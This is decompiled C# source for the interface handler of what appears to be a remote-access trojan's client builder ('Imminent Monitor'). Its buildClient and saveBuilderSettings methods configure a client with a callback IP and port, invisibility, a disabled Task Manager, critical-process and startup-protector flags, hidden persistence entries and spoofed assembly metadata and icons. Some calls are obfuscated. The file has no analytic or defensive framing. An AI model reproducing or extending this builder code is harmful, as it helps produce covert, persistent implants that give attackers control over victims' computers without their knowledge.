// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.MainCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace ImminentMonitor.Cef
{
  public class MainCefHandler
  {
    public FormMain MainForm;
    public GClass46 Wrapper;
    private Class159 Serializer;

    public MainCefHandler(FormMain parentForm)
    {
      this.Serializer = new Class159();
      this.MainForm = parentForm;
      this.Wrapper = new GClass46();
    }

    public void close() => this.MainForm.Invoke((Delegate) (() => this.MainForm.Close()));

    public void handleTab(string id)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) id
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "iVSe%Pa.Q$", object_3);
    }

    public void handleSettingsTab()
    {
      this.hideMainInterface();
      this.MainForm.Invoke((Delegate) (() => Class148.smethod_4()));
    }

    private void LoadFrameworkVersions()
    {
      this.AddFrameworkVersion("2.0 (Included by default in Windows 7 and lower, included with .Net 3.5)");
      this.AddFrameworkVersion("3.5 (Included by default in Windows 7, can be enabled in Windows 8.1/10)");
      this.AddFrameworkVersion("4.0 (Included by default in Windows 8/8.1 and Windows 10");
    }

    private void AddFrameworkVersion(string versionText)
    {
      MainCefHandler mainCefHandler = this;
      this.MainForm.Invoke((Delegate) (() => Class97.smethod_20(mainCefHandler.MainForm.vmethod_58(), string.Format("addItem('{0}', 'frameworkVersion')", (object) versionText))));
    }

    public void selectIcon()
    {
      MainCefHandler mainCefHandler = this;
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.DefaultExt = "ico";
      openFileDialog.Filter = "icon files (*.ico)|*.ico";
      openFileDialog.FilterIndex = 1;
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.MainForm.Invoke((Delegate) (() => Class97.smethod_20(mainCefHandler.MainForm.vmethod_58(), string.Format("$('#AssemblyIcon').val('{0}');", (object) openFileDialog.FileName.Replace("\\", "\\\\")))));
    }

    public void builderProfiles()
    {
      int num;
      this.MainForm.Invoke((Delegate) (() => num = (int) Class132.smethod_3().method_5().ShowDialog()));
    }

    public void saveBuilderSettings(
      string companyName,
      string contactEmail,
      bool invisibleClient,
      string ip,
      string port,
      string group,
      bool fileIntegration,
      bool hiddenProperties,
      bool clientStartupProtector,
      bool disableTaskManager,
      bool processSecurityFlag,
      bool criticalProcessFlag,
      bool processWatcher,
      bool enableStartup,
      string startupEntryName,
      string startupFolderName,
      string startupFileName,
      string assemblyTitle,
      string assemblyDescription,
      string assemblyCompany,
      string assemblyProduct,
      string asssemblyCopyright,
      string assemblyVersion,
      string assemblyIcon)
    {
      MainCefHandler mainCefHandler = this;
      ProfileSettings profileSettings_0 = new ProfileSettings();
      profileSettings_0.set_CompanyName(companyName);
      profileSettings_0.set_ContactEmail(contactEmail);
      profileSettings_0.set_InvisibleClient(invisibleClient);
      profileSettings_0.set_IP(ip);
      profileSettings_0.set_Port(Conversions.ToUShort(port));
      profileSettings_0.Group = group;
      profileSettings_0.FileIntegration = fileIntegration;
      profileSettings_0.HiddenProperties = hiddenProperties;
      profileSettings_0.ClientStartupProtector = clientStartupProtector;
      profileSettings_0.DisableTaskManager = disableTaskManager;
      profileSettings_0.ProcessSecurityFlag = processSecurityFlag;
      profileSettings_0.CriticalProcessFlag = criticalProcessFlag;
      profileSettings_0.ProcessWatcher = processWatcher;
      profileSettings_0.EnableStartup = enableStartup;
      profileSettings_0.StartupEntryName = startupEntryName;
      profileSettings_0.StartupFolderName = startupFolderName;
      profileSettings_0.StartupFileName = startupFileName;
      profileSettings_0.AssemblyTitle = assemblyTitle;
      profileSettings_0.AssemblyDescription = assemblyDescription;
      profileSettings_0.AssemblyCompany = assemblyCompany;
      profileSettings_0.AssemblyProduct = assemblyProduct;
      profileSettings_0.AssemblyCopyright = asssemblyCopyright;
      profileSettings_0.AssemblyVersion = assemblyVersion;
      profileSettings_0.AssemblyIcon = assemblyIcon;
      FormDialog formDialog = new FormDialog(false, "Profile", "Please Enter a Profile Name");
      string text;
      this.MainForm.Invoke((Delegate) (() =>
      {
        if (formDialog.ShowDialog((IWin32Window) mainCefHandler.MainForm) != DialogResult.OK)
          return;
        text = formDialog.vmethod_4().Text;
        Class148.smethod_1(text, profileSettings_0);
      }));
    }

    public void buildClient(
      string companyName,
      string contactEmail,
      bool invisibleClient,
      string ip,
      string port,
      string group,
      bool fileIntegration,
      bool hiddenProperties,
      bool clientStartupProtector,
      bool disableTaskManager,
      bool processSecurityFlag,
      bool criticalProcessFlag,
      bool processWatcher,
      bool enableStartup,
      string startupEntryName,
      string startupFolderName,
      string startupFileName,
      string assemblyTitle,
      string assemblyDescription,
      string assemblyCompany,
      string assemblyProduct,
      string asssemblyCopyright,
      string assemblyVersion,
      string assemblyIcon,
      string frameworkVersion)
    {
      object[] object_3 = new object[26]
      {
        (object) this,
        (object) companyName,
        (object) contactEmail,
        (object) invisibleClient,
        (object) ip,
        (object) port,
        (object) group,
        (object) fileIntegration,
        (object) hiddenProperties,
        (object) clientStartupProtector,
        (object) disableTaskManager,
        (object) processSecurityFlag,
        (object) criticalProcessFlag,
        (object) processWatcher,
        (object) enableStartup,
        (object) startupEntryName,
        (object) startupFolderName,
        (object) startupFileName,
        (object) assemblyTitle,
        (object) assemblyDescription,
        (object) assemblyCompany,
        (object) assemblyProduct,
        (object) asssemblyCopyright,
        (object) assemblyVersion,
        (object) assemblyIcon,
        (object) frameworkVersion
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "2!gBhPa.Q$", object_3);
    }

    public void handleNews() => new Thread(new ThreadStart(this.HandleNewsThread)).Start();

    private void HandleNewsThread()
    {
      try
      {
        this.LoadTabData(this.Wrapper.method_1("https://imminent.co/news.goaway"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Message("Failed to load news, unable to connect to news server please reload the \"news\" tab", "3500", "error", "right");
        Class97.gclass2_0.method_0("[Error] Failed to load news, unable to connect to news server please reload the \"news\" tab", Class97.gclass2_0.textStyle_3);
        ProjectData.ClearProjectError();
      }
    }

    public void HandleMap()
    {
      try
      {
        foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
        {
          // ISSUE: object of a compiler-generated type is created
          // ISSUE: variable of a compiler-generated type
          MainCefHandler._Closure\u0024__11 other = new MainCefHandler._Closure\u0024__11(other);
          // ISSUE: reference to a compiler-generated field
          other.\u0024VB\u0024Local_c = gclass18;
          // ISSUE: reference to a compiler-generated field
          other.\u0024VB\u0024Me = this;
          // ISSUE: reference to a compiler-generated method
          this.MainForm.Invoke((Delegate) new Delegate0(other._Lambda\u0024__17));
        }
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
      this.MainForm.Invoke((Delegate) (() =>
      {
        FormMain mainForm1 = this.MainForm;
        Size size1;
        ref Size local = ref size1;
        Size size2 = this.MainForm.Size;
        int width = size2.Width - 5;
        int height = this.MainForm.Size.Height - 1;
        local = new Size(width, height);
        Size size3 = size1;
        mainForm1.Size = size3;
        FormMain mainForm2 = this.MainForm;
        size2 = new Size(this.MainForm.Size.Width + 5, this.MainForm.Size.Height + 1);
        Size size4 = size2;
        mainForm2.Size = size4;
      }));
    }

    public void showGeoIPHandler()
    {
      int num;
      this.MainForm.Invoke((Delegate) (() => num = (int) Class132.smethod_3().method_2().ShowDialog()));
    }

    public void handleSaveButton(
      bool autoListen,
      bool notification,
      bool soundNotification,
      bool minTray,
      bool closeTray,
      bool anon)
    {
      Class97.generalSettings_0.set_AutoListen(autoListen);
      Class97.generalSettings_0.Notification = notification;
      Class97.generalSettings_0.SoundNotification = soundNotification;
      Class97.generalSettings_0.MinTray = minTray;
      Class97.generalSettings_0.CloseTray = closeTray;
      Class97.generalSettings_0.AnonymousErrorReporting = anon;
      Class97.formMain_0.Invoke((Delegate) (() => Class148.smethod_6()));
    }

    public void hideMainInterface() => this.MainForm.Invoke((Delegate) (() =>
    {
      this.MainForm.vmethod_2().Hide();
      this.MainForm.vmethod_8().Hide();
      this.MainForm.vmethod_54().Hide();
    }));

    public void handlePortsTab()
    {
      this.hideMainInterface();
      this.MainForm.Invoke((Delegate) (() => this.MainForm.vmethod_8().Show()));
    }

    public void handleUpnpTab()
    {
      this.hideMainInterface();
      this.MainForm.Invoke((Delegate) (() => this.MainForm.vmethod_54().Show()));
    }

    private void Message(string errorMessage, string time, string type)
    {
      MainCefHandler mainCefHandler = this;
      string string_4 = "toastr." + type + "('" + errorMessage + "', undefined, {timeOut: " + time + ", positionClass: 'toast-bottom-center'} )";
      this.MainForm.Invoke((Delegate) (() => Class97.smethod_20(mainCefHandler.MainForm.vmethod_58(), string_4)));
    }

    private void Message(string errorMessage, string time, string type, string orientation)
    {
      MainCefHandler mainCefHandler = this;
      string string_4 = "toastr." + type + "('" + errorMessage + "', undefined, {timeOut: " + time + ", positionClass: 'toast-bottom-" + orientation + "'} )";
      this.MainForm.Invoke((Delegate) (() => Class97.smethod_20(mainCefHandler.MainForm.vmethod_58(), string_4)));
    }

    private string GetTabData(string id) => File.ReadAllText(string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\tabs\\{1}.html", (object) Application.StartupPath, (object) id));

    private void LoadTabData(string html, string id)
    {
      MainCefHandler mainCefHandler = this;
      string string_4 = string.Format("$('.page').empty();$('.page').append('{0}');fixTheThing({1});", (object) html.Replace("'", "\\'").Replace(Environment.NewLine, string.Empty).Replace("\r", string.Empty).Replace("\n", string.Empty), (object) id);
      this.MainForm.Invoke((Delegate) (() => Class97.smethod_20(mainCefHandler.MainForm.vmethod_58(), string_4)));
    }

    private void LoadTabData(string html)
    {
      MainCefHandler mainCefHandler = this;
      string string_4 = string.Format("$('.page').empty();$('.page').append('{0}');", (object) html.Replace("'", "\\'").Replace(Environment.NewLine, string.Empty).Replace("\r", string.Empty).Replace("\n", string.Empty));
      this.MainForm.Invoke((Delegate) (() => Class97.smethod_20(mainCefHandler.MainForm.vmethod_58(), string_4)));
    }

    private void ShowCommand(int index)
    {
      MainCefHandler mainCefHandler = this;
      int num = index;
      this.MainForm.Invoke((Delegate) (() =>
      {
        mainCefHandler.hideMainInterface();
        mainCefHandler.MainForm.vmethod_2().Show();
        mainCefHandler.MainForm.vmethod_2().SelectedIndex = num;
        Class97.smethod_20(mainCefHandler.MainForm.vmethod_58(), "$('.page').empty();");
        mainCefHandler.MainForm.vmethod_2().Focus();
      }));
    }
  }
}
